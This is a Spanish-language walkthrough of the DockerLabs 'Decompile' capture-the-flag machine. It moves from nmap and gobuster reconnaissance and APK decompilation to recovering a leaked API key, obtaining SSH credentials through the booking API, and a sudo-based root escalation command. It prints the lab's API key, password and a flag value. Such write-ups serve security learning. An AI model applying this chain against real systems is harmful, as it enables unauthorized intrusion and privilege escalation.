# Decompile - DockerLabs🇪🇸


# 1 Encender laboratorio.

### 1.1 Primero encenderemos la máquina vulnerable.

```bash
sudo bash ./auto_deploy.sh decompile.tar 
```

<img width="852" height="602" alt="image" src="https://github.com/user-attachments/assets/f4d79d1a-6fa1-4324-9f27-37ff7f16487a" />


### 1.2 Realizamos un ping para comprobar que hay conexión.

```bash
ping -c3 172.17.0.2
```

<img width="851" height="227" alt="image" src="https://github.com/user-attachments/assets/38d527a7-15fd-49f2-b7cb-b89306dbfe07" />


# 2. Reconocimiento

### 2.1 Realizaremos un escaneo de puertos mediante nmap.

```bash
 nmap -p- -sCV 172.17.0.2
```

<img width="843" height="361" alt="image" src="https://github.com/user-attachments/assets/405a6f90-cd07-435a-abdf-681429fe4713" />

*Apreciamos que esta abierto el ssh en el puerto 22 mediante key y está operativo también el puerto 80 http.*


### 2.2 Realizamos un gobuster para ver los directorios ocultos.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,txt,py,bak,sql --exclude-length=806
```

<img width="839" height="472" alt="image" src="https://github.com/user-attachments/assets/0ef65f63-24db-4289-a246-c523b94f34b3" />

*En el http podemos descargar un archivo y nos otorgan esta pista `com/inmohogar/roomshare/BuildConfig.java.`*


# 3. Análisis de vulnerabilidades

### 3.1 Vamos a utilizar jadx para poder inspeccionar el código de la app

```bash
jadx-gui app-release.apk &
```

<img width="831" height="758" alt="image" src="https://github.com/user-attachments/assets/25be8bd2-7cbf-4df3-b153-077a10ac6f6c" />

*Añadimos a `/etc/hosts` `172.17.0.2 booking.internal` para facilitar las peticiones.*

## CTF_STAGE1 FLAG `FLAG{stage1_buildconfig_leak_BKGVlytS}`

<img width="851" height="491" alt="image" src="https://github.com/user-attachments/assets/10102c8f-3df1-4b51-958b-132c7e3e6005" />



### 3.2 Mirando en los ficheros vemos un posible rsa para el ssh.

<img width="839" height="591" alt="image" src="https://github.com/user-attachments/assets/abd8d473-6b99-4c7a-8a3b-121ffb231ee3" />


### 3.3 Mediante el api-key que encontramos vamos a ir comprobando si podemos llegar al servidor.
```bash
 curl -H "X-API-Key: BKGVlytsjDihCgXmNpm1c6QwhRjrT86yJ2Seaf9" http://booking.internal:80/v3/
```

<img width="849" height="99" alt="image" src="https://github.com/user-attachments/assets/af4de6c4-6307-4753-a490-4d4120a4341b" />

### 3.4 Con la api-key vamos a realizar un ffuf en `/target/booking`.
```bash
ffuf -u http://booking.internal/booking/FUZZ -H "X-API-Key: BKGVlytsjDihCgXmNpm1c6QwhRjrT86yJ2Seaf9" -w /usr/share/wordlists/dirb/common.txt -fc 404
```

<img width="848" height="464" alt="image" src="https://github.com/user-attachments/assets/5349ed43-18cb-4e65-8586-9aea1b5bbbf3" />


### 3.5 Vamos a leer el con un `curl` al tener la api-key y ya tener el directorio.

```bash
curl -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" \
  http://booking.internal/booking/properties.php
```

<img width="847" height="181" alt="image" src="https://github.com/user-attachments/assets/60bb167f-6c07-499f-b0cd-090f666cc3b1" />


# 4. Explotación

### 4.1 Leemelos el .php al tener la creedencial necesaria.

```bash
curl -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" \
  http://booking.internal/booking/properties.php
```
<img width="849" height="190" alt="image" src="https://github.com/user-attachments/assets/a179be8d-35bd-4dc5-ad77-1ae0d3b387c6" />

*Confirmamos que la Api-key es válida, ahora vamos a proceder a crear un inicio de sesión*


### 4.2 Vamos a crear un inicio de sesión.

```bash
curl -X POST \
  -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" \
  -H "Content-Type: application/json" \
  -d '{"tenant_account": "INMO-MAD-PRIMARY"}' \
  http://booking.internal/booking/sessions
```

<img width="839" height="243" alt="image" src="https://github.com/user-attachments/assets/0a142104-e4f5-4b3d-bfe2-a18feb0aba3e" />



### 4.3 Al darnos el usuario y contraseña del ssh entraremos.

```bash
ssh deploy@172.17.0.2
# passwd c0mpartir-p1s0s
```

<img width="813" height="506" alt="image" src="https://github.com/user-attachments/assets/8f9d44c0-2fa2-4f1c-b45c-417842e17446" />


## FLAG STAGE2

<img width="430" height="21" alt="image" src="https://github.com/user-attachments/assets/d4a9e5b4-f888-4de8-af53-6fc93aa91684" />


# 5. Escala de privilegios

### 5.1 Ahora al estar dentro vamos a ver que permiso de binarios tiene con `sudo -l`.


<img width="849" height="190" alt="image" src="https://github.com/user-attachments/assets/8f86a450-b983-4ab6-ac96-61c358269b5d" />

## FLAG STAGE3

<img width="488" height="65" alt="image" src="https://github.com/user-attachments/assets/e52e5f06-1cb6-4109-a137-927134755748" />



### 5.2 Escalamos a root bastante sencillo porque como podemos ejecutar sin que nos pidan la password ejecutamos el típico exploit con `!# /bin/bash`.

```bash
 sudo /opt/decompile/ssh/privesc/manage-svc "/bin/bash"
```


<img width="822" height="85" alt="image" src="https://github.com/user-attachments/assets/24b6bc43-4977-447f-8eca-75a0017f8622" />


## ROOT FLAG

<img width="615" height="116" alt="image" src="https://github.com/user-attachments/assets/758398ba-7879-4084-8dd9-b4c7308ff795" />



